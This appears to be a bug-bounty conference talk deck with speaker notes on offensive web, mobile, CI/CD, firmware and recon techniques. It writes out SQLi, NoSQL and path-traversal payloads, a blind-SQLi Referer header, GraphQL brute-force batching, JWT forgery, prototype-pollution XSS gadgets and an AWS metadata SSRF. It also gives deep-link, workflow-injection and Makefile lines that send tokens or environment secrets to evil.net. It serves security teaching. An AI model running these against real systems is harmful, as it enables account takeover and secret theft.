The Mindset

the part that actually matters

You are not a "pentester"

You are a very confused user

The app expects you to click "Submit".
You're asking: what if I don't?

Three questions. Always.

  1. Where does my data go?
  2. What does the server trust that it shouldn't?
  3. What happens if I lie?

Every OWASP category is just a specific answer to one of these.

Let's prove it

The Rabbit Hole Rule

If something looks weird, you have 15 minutes to chase it.

After 15 min: write it down, move on, come back later.

90% of my best bugs came from the "come back later" list.

My actual list system

weird.md — one file, append-only

2026-01-14 · target.com · /api/export takes a `template` param that looks like a file path. 403'd on ../. Try encoding?

2026-01-14 · target.com · JWT has a `scope` claim I've never seen. What reads it?

2026-01-19 · target.com · came back to template param. Double URL encoding → 200. LFI. 🎉

Boring? Yes. This file has made me more money than any tool.

Show of hands — who has a system like this? Almost nobody. Everyone relies on memory. Memory is terrible. The template param → LFI thing here is a real entry. I ignored it for 5 days. Came back because I was procrastinating on something else. Double URL encoding. Done. The file doesn't need to be fancy. It needs to EXIST.

Dev brain vs Hacker brain

Developer sees:

if (user.role === 'admin')

"Only admins can do this. ✅ Done."
Hacker sees:

if (user.role === 'admin')

"Where does user.role get set? Can I set it? What if it's ['admin']? What if it's 'Admin'? What if the user object is null?"
Same line of code. Totally different reading. This is the whole game.

A03 Injection A01 Broken Access Control

How to start

  1. Open DevTools → Network tab → filter XHR/Fetch
  2. Click every button. Watch what fires.
  3. Find the request with the most parameters. That's your target.

No Burp yet. No scanner. Just you and F12.

Get blocked by WAF.
Conclude the app is "secure."
Leave.
F12-first beginners:

Understand what each does.
Notice one returns other users' data.
Don't even need a payload.

Trick #1 — Change one thing


POST /api/export HTTP/1.1
Host: target.com
Content-Type: application/json

{"format": "pdf", "report_id": 1337}
    

{"format": "pdf", "report_id": 1338}              ← IDOR
{"format": "pdf", "report_id": [1337, 1338]}      ← type confusion
{"format": "pdf", "report_id": {"$gt": 0}}        ← NoSQL
{"format": "pdf", "report_id": "1337' OR '1'='1"} ← SQLi
{"format": "../../etc/passwd", "report_id": 1337} ← path traversal
{"format": "pdf", "report_id": 1337, "user_id": 1}← param pollution

Trick #2 — HTTP method swap


GET /api/users/5/settings HTTP/1.1     ← works, shows my settings
    

POST   /api/users/5/settings   ← 405? or does it create something?
PUT    /api/users/5/settings   ← update with no body?
DELETE /api/users/5/settings   ← 😬
PATCH  /api/users/5/settings   ← partial update, often no authz check
HEAD   /api/users/5/settings   ← sometimes bypasses auth middleware entirely

Frameworks route by path first, check method second. Authz often only guards GET.

War story — the header nobody checks

Blind SQLi. Via the Referer header. Paid 8.5.

Every body param, every query string — WAF blocked ' instantly.
Referer header? Logged straight into an analytics table. Raw.

Referer: https://x.com/'||(SELECT CASE WHEN(1=1) THEN pg_sleep(5) END)||'

5-second delay. Confirmed. The WAF was watching the front door. I walked in through the HVAC.
Found this pattern 8+ times across different programs. Referer, User-Agent, X-Forwarded-For — anything that gets logged probably gets stored. And "stored" often means "INSERT INTO". WAFs don't inspect these by default.

War story — the export that exported everyone

Found this shape 10+ times. Different companies. Same bug.

POST /api/reports/export with {"customer_id": 1337}

Auth check? ✅ Valid JWT required.
Ownership check? ❌ Never asked if 1337 was mine.

"Export" features get added late, by a different dev, as a convenience. They copy the auth middleware. They forget the authz check. Every. Time.
This is THE most repeatable bug in my dataset. When you see "Export", "Download report", "Generate PDF" — your pulse should quicken. Change the ID. It works more often than it doesn't.

GET /api/users/me
→ {"id":5, "email":"me@x.com", "name":"rotem",
   "role":"user", "is_verified":false,

Trick #2 — GraphQL alias batching

Rate limit says 5 login attempts per minute? Cool.


mutation {
  a1: login(user:"admin", pass:"password1") { token }
  a2: login(user:"admin", pass:"password2") { token }
  a3: login(user:"admin", pass:"123456")    { token }
  a4: login(user:"admin", pass:"admin")     { token }
  ...1000 more aliases...
}

One HTTP request. One rate-limit hit. 1000 password guesses.
Most GraphQL servers don't limit query complexity or alias count.

War story

SaaS platform. GraphQL API. Introspection disabled (good!).

But: error messages were verbose.

query { user { xyz } }
→ "Cannot query field 'xyz' on type 'User'. Did you mean 'xxxSecretField'?"

I bruteforced the entire schema via typo suggestions. 40 minutes. Found an internalNotes field on every customer record.
Apollo Server's "Did you mean?" feature. Helpful for devs. Devastating for hiding your schema. Now there's a tool for this: clairvoyance.

Bonus — /metrics is a free API spec

Found 6+ times. Spring Boot apps. Always the same.

GET /actuator/prometheus → 200 OK, no auth

http_server_requests_seconds_count{method="POST",
  uri="/api/internal/admin/users/{id}/impersonate", status="200"} 47

Every endpoint. Every method. Every path parameter. How often it's called. Which ones return 500. It's a Swagger spec that writes itself.
Low severity on its own (3.7). But it's the best recon you'll ever get. I've found admin impersonation endpoints, internal debug routes, and unreleased API versions — all from a metrics page nobody thought to lock.

Trick #1 — JWT algorithm confusion


// Original — asymmetric, can't forge without private key
{"alg": "RS256", "typ": "JWT"}
{"sub": "user_123", "role": "user"}
    

// Forged — symmetric, sign with their PUBLIC key as the HMAC secret
{"alg": "HS256", "typ": "JWT"}
{"sub": "user_123", "role": "admin"}

Library: "HS256? I'll verify with the key you gave me." Key = public RSA key. Verification passes.

Trick #2 — The password reset race

T+0: Request password reset for victim@target.com
T+0.001s: Request password reset for attacker@evil.com
Server: generates token based on timestamp + user_id… but both requests hit in the same millisecond
Result: both emails get the same token. Or sequential tokens. Or I can predict victim's from mine.

Send 20 parallel requests with Turbo Intruder. Check your inbox. Check if the tokens rhyme.

The 2FA bypass speedrun


POST /verify-otp  {"otp": "123456"}  → 401
Can I just... not?

POST /verify-otp  {}                  → what happens?
POST /verify-otp  {"otp": null}       → what happens?

POST /verify-otp  {"otp": "000000"}   → some use static test codes
POST /verify-otp  {"otp": true}       → type coercion in PHP/JS

GET  /dashboard                        → is 2FA only checked on /verify?
POST /api/v1/verify-otp  (v2 has 2FA, does v1?)

Response manipulation:
{"success": false}  →  intercept  →  {"success": true}  →  does client trust it?

War story — the field swap

Multi-step signup. Found this shape 5+ times.

Step 1: Enter email + phone → OTP sent to phone
Step 2: Enter OTP → verified ✅
Step 3: Set password → account created

Between step 2 and step 3, I changed the email field to victim@target.com.

Server: "phone verified = user verified." Never re-checked the email.
I now own victim's account. My phone. Their email.

Multi-step flows trust that earlier steps stay true. They don't.
The mental model: state machines with no state. Each API call validates itself — nobody validates the SEQUENCE. Variant I've also hit: password reset where step 1 sends token, step 3 sets password, and step 2 (verify token) can just be... skipped. Call 1 then 3. Works. Ask the room: who's built a signup flow? Did you re-validate the email at the END? Almost nobody does. The bug is in the assumption, not the code.

Trick #2 — Prototype pollution

The bug class nobody understands (including most devs)


// Vulnerable: recursive merge (lodash <4.17.12, jQuery $.extend deep, ...)
function merge(target, source) {
  for (let key in source) { target[key] = source[key]; }
}

// Attacker controls source (query string, JSON body, whatever):
merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'))
// Now EVERY object in the app has .isAdmin === true
// (unless it was explicitly set to something else)

// Somewhere else in the code, much later:
if (user.isAdmin) { ... }   // user.isAdmin was never set
// → falls through to Object.prototype.isAdmin → true → 🎉

Finding PP in the wild


// In DevTools console on the target:
Object.prototype.polluted = "yes";

// Then use the app. If ANYTHING breaks weirdly → there's a gadget.
// If nothing breaks → try specific properties:
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';
Object.prototype.src = 'javascript:alert(1)';
Object.prototype.srcdoc = '<script>alert(1)</script>';

// Refresh. Click things. Wait for the pop.

Client-side PP → XSS. Server-side PP (Node) → RCE. Same bug.

Trick #2 — Exported deep links

AndroidManifest.xml is a public API contract


<activity android:name=".WebViewActivity"
          android:exported="true">
  <intent-filter>
    <data android:scheme="myapp"
          android:host="open" />
  </intent-filter>
</activity>
<!-- Takes a "url" param → loads it in WebView with JS enabled -->
    

# Any app (or web page!) can trigger:
adb shell am start "myapp://open?url=javascript:fetch('/api/token').then(r=>r.text()).then(t=>location='//evil.net/'+t)"

The WebView has the app's cookies. The JavaScript has the WebView. You have everything.

War story — TikTok

One of my TikTok findings.

Deep link handler → took a URL → loaded in internal WebView.
URL validation: url.contains("tiktok.com")

My URL: https://evil.net/?tiktok.com

WebView loads my page. WebView has addJavascriptInterface exposing native methods. My JS calls native methods. Native methods include "get auth token."

One deep link, sent via any channel (SMS, web, another app) → full account takeover. No user interaction beyond tapping a link.
Redacted/simplified but this is the shape of a LOT of mobile bugs. The attack surface isn't the app. It's the SEAMS between app and OS.

Bonus — deep link straight to the cloud

Different app. Same seam. Paid 10.0.

myapp://download?file=<guid> → fetch file from backend by GUID.

GUID not found? The handler had a fallback: treat the param as a URL and fetch it directly. Convenience code. Never meant to ship.

myapp://download?file=http://169.254.169.254/latest/meta-data/iam/security-credentials/

App runs on EC2. Fetches metadata. Returns AWS creds as the "download."

Mobile bug → cloud compromise. The app was the SSRF proxy. One tap on a link.
This is why I keep saying the areas bleed into each other. This is a mobile finding that's actually a cloud finding that's actually a code-review finding (the fallback branch). Category is for the report. The bug doesn't care.

07 CI/CD & Supply Chain

A08 Software & Data Integrity

my love language

Why this area is different

The pipeline has more privileges than any human at the company.

It can: push to prod · read every secret · assume IAM roles · sign releases · deploy infrastructure.

And it runs code from pull requests.

How to start

Read .github/workflows/*.yml in any public repo. Look for:

pull_request_target→ runs with write token on forked PR code
${{ github.event.* }} in run:→ shell injection via issue/PR fields
actions/checkout + ref: user input→ checks out attacker code
secrets.* → untrusted action→ third-party steals your secret
GITHUB_TOKEN with permissions: unset→ default = write-all (on old repos)

Trick #1 — Expression injection


# .github/workflows/label-issue.yml
on: issues
jobs:
  triage:
    steps:
      - run: echo "New issue: ${{ github.event.issue.title }}"
    

Issue title: x"; curl -d "$(env)" evil.net; echo "

Shell receives:
echo "New issue: x"; curl -d "$(env)" evil.net; echo ""
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                    every secret in the runner environment
GitHub expressions are expanded BEFORE the shell sees them. It's not a variable. It's literal string substitution. Into bash.

Trick #2 — Poisoned Pipeline Execution (PPE)

You can't edit the pipeline. But the pipeline runs things you CAN edit.


# Jenkinsfile — protected, you can't touch it
pipeline {
  stages {
    stage('Build') {
      steps { sh 'make build' }    ← runs Makefile
    } } }
    

# Makefile — NOT protected, it's "just code"
build:
    @curl -d "$$(env | base64)" https://evil.net/
    @gcc -o app main.c   # still build, nobody notices

Also works via: package.json scripts · setup.py · gradle tasks · terraform external data · pre-commit hooks

War story — the flag that lied

Paid 8.9. This one hurt the defenders.

CI pipeline ran: npm ci --ignore-scripts
Safe, right? No install scripts = no RCE from a malicious PR.

My PR added one file: .npmrc
onload-script=./pwn.js

--ignore-scripts blocks preinstall/postinstall.
It does not block onload-script. Different mechanism. Undocumented.

Runner executed my JS with full env. AWS keys, GitHub token, everything. The defense was correct. The assumption wasn't.
This is my favorite kind of bug. The defender did everything right according to the docs. The docs were incomplete. Read the SOURCE of your security controls, not just the README. Variant: .npmrc with git= override → npm runs YOUR git binary on git deps.

Artifact poisoning — the sneaky one


# Workflow A — runs on pull_request (UNTRUSTED, no secrets)
on: pull_request
jobs:
  build:

The firmware grep checklist


# Credentials
cat etc/shadow etc/passwd      # hash? crack it. empty? walk in.

# Hardcoded secrets
grep -rn "PRIVATE KEY\|password\|passwd\|secret" etc/ usr/

# Debug services left on
grep -rn "telnetd\|utelnetd\|dropbear\|gdbserver" etc/init.d/

# Web admin panel (usually PHP or Lua CGI from 2009)
find . -path "*/www/*" -name "*.php" -o -name "*.cgi" -o -name "*.lua"

# Update mechanism — can you push your own firmware?
grep -rn "wget\|curl\|http://\|fwupdate\|upgrade" etc/ sbin/

# Certificate validation (spoiler: often no)
grep -rn "verify.*false\|VERIFY_NONE\|-k\|--insecure"

09 Source Code Analysis

Sources & Sinks The Cheat Code LIVE DEMO

The mental model

Sources — where attacker data enters

req.body · req.query · req.params · req.headers · process.argv · os.environ · file reads · DB reads of user data · message queue payloads
Sinks — where data does damage

eval · exec · query · innerHTML · system · deserialize · open/readFile · redirect · res.send · template render

Bug = source reaches sink without sanitization in between.

Trick #1 — grep IS a SAST tool


# SQLi — string concat into queries
grep -rn "query.*+\|query.*\${" --include="*.js" --include="*.py"

# Command injection
grep -rn "exec\|spawn\|system\|popen\|shell=True\|Runtime.getRuntime"

# Deserialization
grep -rn "pickle.loads\|yaml.load(\|unserialize\|readObject\|Marshal.load"

# SSRF
grep -rn "requests.get\|urllib\|http.get\|axios.get\|fetch(" | grep -i "req\.\|request\.\|params"

# Path traversal
grep -rn "open(\|readFile\|sendFile\|render(" | grep -i "req\.\|params\|query"

# Secrets (git history too!)
git log --all -p | grep -iE "AKIA|sk_live|BEGIN.*PRIVATE|password.*="

Trick #2 — Read the tests

Tests are documentation of what the dev thought could happen.
Bugs are what they didn't think could happen. 

# tests/test_export.py
def test_export_pdf():
    assert export(format="pdf") == ...
def test_export_csv():
    assert export(format="csv") == ...

# No test for: format="../../etc/passwd"
# No test for: format=""
# No test for: format=["pdf","csv"]

The gaps in the test suite are a map of the attack surface.

10 Recon

Attack Surface OSINT Asset Discovery

The core insight

The bug is in the asset they forgot they own.

Main app = 10 pentests a year, WAF, bug bounty, monitoring.
Staging server from the 2019 acquisition = root:root.

Trick #1 — JS files are sitemaps


# Download the main bundle
curl -s https://app.target.com/main.js > main.js

# Extract paths
grep -oE '"/[a-zA-Z0-9_/\.-]+"' main.js | tr -d '"' | sort -u

# Extract full URLs (third parties, internal APIs, S3 buckets)
grep -oE 'https?://[a-zA-Z0-9._/-]+' main.js | sort -u

# Extract the spicy stuff
grep -iE 'api[_-]?key|secret|token|password|aws|firebase' main.js

Frontend devs hardcode everything. Including routes that have no button.

Trick #2 — Wayback is a time machine for bugs


# Every URL archive.org ever saw for this domain
echo target.com | waybackurls > urls.txt
wc -l urls.txt   # often 50,000+ URLs

# The gold:
grep -iE "\.env|\.git|\.bak|backup|\.sql|\.zip|config" urls.txt
grep -iE "api_key|token|secret|password" urls.txt
grep -iE "/api/v1/" urls.txt   # old API versions — often still live, less auth

# Check if they're still alive (many are)
cat urls.txt | httpx -silent -status-code -title | grep 200

Endpoint deprecated in 2021? Still responding in 2026. With the old auth logic.

Chaining It Together

real attacks don't stay in one box

Bugs are legos

Individually: low/medium severity. Nobody cares.
Chained: critical. Everybody cares.

Real chain from my reports — each step was "medium" alone:

#04 Browser → reflected XSS on a marketing subdomain (5.0, boring)

→ Account takeover from a marketing page XSS. Paid 8.3.

Three "won't-fix"-tier findings. One critical chain. The report that triages your bug doesn't see the other two.
